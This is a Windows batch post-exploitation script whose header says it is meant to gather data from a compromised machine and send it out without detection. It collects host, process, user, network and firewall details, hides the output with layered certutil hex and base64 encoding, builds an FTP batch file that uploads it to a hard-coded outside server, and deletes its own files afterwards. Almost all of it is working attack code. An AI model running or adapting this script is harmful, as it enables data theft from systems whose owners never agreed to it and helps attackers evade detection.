::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:
:  NAME: Post Exploit Script
:
:  AUTHOR: Bobby Brooks
:
:  DATE: 22 May 2015
:
:  PROBLEM: I'm lazy and impatient and just want to run a script that will pull 
:        all relevant data off a box without any interaction on my part
:  
:  PURPOSE: To allow me to immediately run a post-exploit script that collects 
:        data and exfiltrates it without detection and with no user interaction.
:
:  STATUS: Development (1 June 2015)
:
:  NOTES: 
:        
:  USE: 
:
:  REFS: N/A (at the moment)
:
:  HISTORY:
:        22 May 2015 - 0.1
:
:  TESTING:
:        22 May 2015
:                Used in conjunction with Metasploit reverse TCP shell
:
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


: Collect info
hostname > test.txt

: Need to see arguments for tasklist
tasklist /v >> test.txt
tasklist /m >> test.txt
tasklist /svc >> test.txt

whoami >> test.txt

netstat -ano >> test.txt

nbtstat -n >> test.txt
nbtstat -c >> test.txt

net user >> test.txt

route print >> test.txt

arp -a >> test.txt

sc query >> test.txt

netsh firewall show >> test.txt

systeminfo >> test.txt

: More commands to run
: reg query
: dir walk
: tree
: 
: run wmic nteventlog list brief at beginning and end to compare logs
: 

: encode hex 1 time then 3 times base64 (13 is my lucky number)
certutil -encodehex test.txt test2.txt && del test.txt && ren test2.txt test.txt
certutil -encode test.txt test2.txt && del test.txt && ren test2.txt test.txt
certutil -encode test.txt test2.txt && del test.txt && ren test2.txt test.txt
certutil -encode test.txt test2.txt && del test.txt && ren test2.txt test.txt


: Exfil Data
: Create a batch file that creates a config file for FTP (nested commands with ^)
: And then exfil to my FTP server
echo @echo off> fileup.bat
echo echo user ftpuser^> ftpcmd.dat>> fileup.bat
echo echo ftpuser^>^> ftpcmd.dat>> fileup.bat
echo echo bin^>^> ftpcmd.dat>> fileup.bat
: This is if I want a variable name
: echo echo put %1^>^> ftpcmd.dat>> fileup.bat
echo echo put test.txt^>^> ftpcmd.dat>> fileup.bat
echo echo quit^>^> ftpcmd.dat>> fileup.bat
echo ftp -n -s:ftpcmd.dat 1.2.3.4>> fileup.bat
: echo del ftpcmd.dat>> fileup.bat

: Run the command to upload the obfuscated (not encrypted) data
: This is if I want a variable instead of hard-coding it into the script
: fileup test.txt
fileup

: This is cleaning up after myself...like a ninja :-)
del fileup.bat
del ftpcmd.dat
del test.txt


: This is the de-obfuscation piece...must uncomment to run
:certutil -decode test.txt test2.txt && del test.txt && ren test2.txt test.txt
:certutil -decode test.txt test2.txt && del test.txt && ren test2.txt test.txt
:certutil -decode test.txt test2.txt && del test.txt && ren test2.txt test.txt
:certutil -decodehex test.txt test2.txt && del test.txt && ren test2.txt test.txt
